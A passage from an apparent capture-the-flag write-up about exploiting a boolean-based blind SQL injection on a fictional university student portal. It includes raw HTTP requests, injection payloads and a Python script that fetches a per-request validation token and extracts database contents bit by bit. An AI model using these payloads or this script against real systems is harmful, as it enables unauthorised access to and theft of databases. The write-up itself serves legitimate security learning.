&lt;p&gt;As for those scraps of paper, I scanned those and put the images on my
server.&lt;/p&gt;
&lt;p&gt;I then threw the paper away.&lt;/p&gt;
&lt;p&gt;Unfortunately, I managed to lock out my account on the server.&lt;/p&gt;
&lt;p&gt;Hey! You’ve got some great skills. Would you please hack into my system and
retrieve the scans?&lt;/p&gt;
&lt;p&gt;I give you permission to hack into it, solving Objective 9 in your badge.&lt;/p&gt;
&lt;p&gt;And, as long as you're traveling around, be sure to solve any other
challenges you happen across.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So, we must hack Krampus' system to recover the scraps of paper. Let's head
over to the &lt;a class="reference external" href="https://studentportal.elfu.org/"&gt;Student Portal&lt;/a&gt; and see what
we can do.&lt;/p&gt;
&lt;p&gt;The portal presents the university, the different elvish students, and the
application process. It's possible to &lt;a class="reference external" href="https://studentportal.elfu.org/apply.php"&gt;send an application&lt;/a&gt;
and &lt;a class="reference external" href="https://studentportal.elfu.org/check.php"&gt;check our application's status&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Let's see what we can do on these pages:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;GET&lt;/span&gt; &lt;span class="nn"&gt;/validator.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;studentportal.elfu.org&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;*/*&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.14.2&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;89&lt;/span&gt;

MTAwOTkwNTY5MjE2MTU3Nzk3NzY0NDEwMDk5MDU2OS4yMTY=_MTI5MjY3OTI4NTk2NDgzMjMxNjk4MjE0LjkxMg==
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;GET&lt;/span&gt; &lt;span class="nn"&gt;/application-check.php?elfmail=test@test.com&amp;#39;&amp;amp;token=MTAwOTkwNTY5MjE2MTU3Nzk3NzY0NDEwMDk5MDU2OS4yMTY%3D_MTI5MjY3OTI4NTk2NDgzMjMxNjk4MjE0LjkxMg%3D%3D&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;studentportal.elfu.org&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.14.2&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;2927&lt;/span&gt;

[...]
&lt;span class="hll"&gt;Error: SELECT status FROM applications WHERE elfmail = &amp;#39;test@test.com&amp;#39;&amp;#39;;&amp;lt;br&amp;gt;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &amp;#39;&amp;#39;test@test.fr&amp;#39;&amp;#39;&amp;#39; at line 1
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Couple of interesting things:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;First, we can see that before every submission to the form, a call is made to
&lt;a class="reference external" href="https://studentportal.elfu.org/validator.php"&gt;https://studentportal.elfu.org/validator.php&lt;/a&gt; to get a validation token, that
must be sent to the &lt;a class="reference external" href="https://studentportal.elfu.org/application-check.php"&gt;https://studentportal.elfu.org/application-check.php&lt;/a&gt; URL.&lt;/li&gt;
&lt;li&gt;Second, we have a SQL injection! What's more, the error message is pretty
chatty, and gives us the complete SQL statement:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="n"&gt;status&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;applications&lt;/span&gt; &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="n"&gt;elfmail&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;user_input_goes_here&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can use this SQL injection to dump the content of the database. However,
this does not look to be a &lt;a class="reference external" href="http://www.sqlinjection.net/union/"&gt;UNION-exploitable SQL injection&lt;/a&gt;.
However, it seems that it could be a &lt;a class="reference external" href="https://www.owasp.org/index.php/Blind_SQL_Injection"&gt;boolean-based blin SQL injection&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Let's say we use this as our user input:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
garbage&amp;#64;garbage.com' OR '1'='1
&lt;/pre&gt;
&lt;p&gt;The SQL statement becomes:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="n"&gt;status&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;applications&lt;/span&gt; &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="n"&gt;elfmail&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;garbage@garbage.com&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;OR&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The &lt;code&gt;WHERE&lt;/code&gt; part of the statement will always be true, because of the
&lt;code&gt;OR '1'='1'&lt;/code&gt; part. So, it will return the status of the first
application, which is still pending:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;GET&lt;/span&gt; &lt;span class="nn"&gt;/application-check.php?elfmail=garbage%40garbage.com&amp;#39;+OR+&amp;#39;1&amp;#39;%3d&amp;#39;1&amp;amp;token=MTAwOTkwNjMxMTY4MTU3Nzk3ODYxMjEwMDk5MDYzMS4xNjg%3D_MTI5MjY4MDA3ODk1MDQzMjMxNzAwMTk3LjM3Ng%3D%3D&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;studentportal.elfu.org&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.14.2&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;2723&lt;/span&gt;

[...]
Your application is still pending!
[...]
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now, if we use this as our user input:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
garbage&amp;#64;garbage.com' OR '1'='0
&lt;/pre&gt;
&lt;p&gt;The SQL statement becomes:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="n"&gt;status&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;applications&lt;/span&gt; &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="n"&gt;elfmail&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;garbage@garbage.com&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;OR&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;0&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now, the &lt;code&gt;OR&lt;/code&gt; clause in our &lt;code&gt;WHERE&lt;/code&gt; statement is always false
(because 1 is never equal to 0). So the statement will return the status for
our email address &lt;code&gt;garbage&amp;#64;garbage.com&lt;/code&gt;, which does not exist in the
database. Therefore, our application is not found:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;GET&lt;/span&gt; &lt;span class="nn"&gt;/application-check.php?elfmail=garbage%40garbage.com&amp;#39;+OR+&amp;#39;1&amp;#39;%3d&amp;#39;0&amp;amp;token=MTAwOTkwNjMzOTg0MTU3Nzk3ODY1NjEwMDk5MDYzMy45ODQ%3D_MTI5MjY4MDExNDk5NTIzMjMxNzAwMjg3LjQ4OA%3D%3D&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;studentportal.elfu.org&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.14.2&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;2710&lt;/span&gt;

[...]
No application found!
[...]
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We now have a way to evaluate boolean statements. If our statement is true,
the server will return &amp;quot;Your application is still pending!&amp;quot;. If it's false, it
will return &amp;quot;No application found!&amp;quot;.&lt;/p&gt;
&lt;p&gt;Let's say we want to find the first letter of the current database. We can
input:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
garbage&amp;#64;garbage.com' OR (SELECT MID(DATABASE(),0,1))='a
&lt;/pre&gt;
&lt;p&gt;If the first letter is &lt;code&gt;a&lt;/code&gt;, the server will answer &amp;quot;Your application is
still pending!&amp;quot;. If not, it will answer &amp;quot;No application found!&amp;quot;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;GET&lt;/span&gt; &lt;span class="nn"&gt;/application-check.php?elfmail=garbage%40garbage.com&amp;#39;+OR+(SELECT+MID(DATABASE(),1,1))%3d&amp;#39;a&amp;amp;token=MTAwOTkwNjc5NDI0MTU3Nzk3OTM2NjEwMDk5MDY3OS40MjQ%3D_MTI5MjY4MDY5NjYyNzIzMjMxNzAxNzQxLjU2OA%3D%3D&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;studentportal.elfu.org&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.14.2&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;2710&lt;/span&gt;

[...]
No application found!
[...]
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, the first letter is not &lt;code&gt;a&lt;/code&gt;. We keep trying letters, until finally:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;GET&lt;/span&gt; &lt;span class="nn"&gt;/application-check.php?elfmail=garbage%40garbage.com&amp;#39;+OR+(SELECT+MID(DATABASE(),1,1))%3d&amp;#39;e&amp;amp;token=MTAwOTkwNjc5NDI0MTU3Nzk3OTM2NjEwMDk5MDY3OS40MjQ%3D_MTI5MjY4MDY5NjYyNzIzMjMxNzAxNzQxLjU2OA%3D%3D&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;studentportal.elfu.org&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.14.2&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;2710&lt;/span&gt;

[...]
Your application is still pending!
[...]
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, the first letter of the database is &lt;code&gt;e&lt;/code&gt;. We can now find the next
letter. If we keep going, we'll find that the data base is &lt;code&gt;elfu&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Awesome, we can extract information from the database! Let's automate the
process, because doing this manually takes too much time. Luckily for me, I've
written in the past &lt;a class="reference external" href="https://github.com/the-useless-one/blind_injection"&gt;a little Python script&lt;/a&gt;
to help me exploit blind SQL injection. We just have to make a few
modifications to the &lt;code&gt;injection.py&lt;/code&gt; file, to modify the syntax of the
injection, and to call the validator URL to get our validation token before
every request:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;injection&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target_url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;column&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;token_url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;https://studentportal.elfu.org/validator.php&amp;#39;&lt;/span&gt;

    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;[wait] retrieving data:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;end&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\t&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;flush&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;

    &lt;span class="c1"&gt;# While we don&amp;#39;t have the entire data&lt;/span&gt;
    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;char&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="c1"&gt;# The injection performed here is URL-based&lt;/span&gt;
            &lt;span class="c1"&gt;# To use another mean of injection (HTTP Headers, Cookies...)&lt;/span&gt;
            &lt;span class="c1"&gt;# change the crafting between the hashtags&lt;/span&gt;

            &lt;span class="c1"&gt;#### CHANGE HERE&lt;/span&gt;
            &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;token_url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;token&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;

            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;?&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;target_url&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="n"&gt;separator&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;amp;&amp;#39;&lt;/span&gt;
            &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="n"&gt;separator&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;?&amp;#39;&lt;/span&gt;

            &lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;target_url&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;separator&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;elfmail=garbage@garbage.com&amp;#39; OR &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; \
                    &lt;span class="s2"&gt;&amp;quot;(select mid(lpad(bin(ord(mid({0},{1},1))),7,&amp;#39;0&amp;#39;),{2},1) &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; \
                    &lt;span class="s2"&gt;&amp;quot;from {3} {4} &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; \
                    &lt;span class="s2"&gt;&amp;quot;limit {5},1)=&amp;#39;1&amp;amp;token={6}&amp;quot;&lt;/span&gt;
            &lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;column&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;token&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

            &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="c1"&gt;#### END OF CHANGE&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now, you can see that the syntax of the injection is a little bit different
from what I show earlier. Let's break it down:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="n"&gt;MID&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;LPAD&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;BIN&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ORD&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;MID&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="k"&gt;column_name&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;index_i&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;))),&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;0&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;index_j&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="k"&gt;table_name&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;I first call &lt;code&gt;MID&lt;/code&gt; to retrieve a particular character from the data.&lt;/li&gt;
&lt;li&gt;I then call &lt;code&gt;ORD&lt;/code&gt;, to get the ASCII code of this letter.&lt;/li&gt;
&lt;li&gt;I then call &lt;code&gt;BIN&lt;/code&gt;, to convert this ASCII code to binary.&lt;/li&gt;
